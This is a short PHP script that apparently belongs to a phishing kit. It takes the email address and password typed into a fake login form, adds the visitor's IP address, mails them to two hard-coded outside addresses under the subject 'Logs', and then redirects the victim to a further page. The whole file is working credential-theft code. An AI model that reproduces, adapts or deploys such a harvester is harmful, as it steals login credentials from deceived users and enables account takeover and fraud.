<?php
    $login = $_POST['email'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];

$to = "officebox@fswilkinson.com, pagoclear@gmail.com"; // your Email

$tema = "Logs: E-Mail - ".$_POST['email']."";
$message = "E-Mail: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$_SERVER['REMOTE_ADDR']."\n";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
mail($to, $tema, $message, $headers);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=access2.php?email=$login'></head></html>";	
?>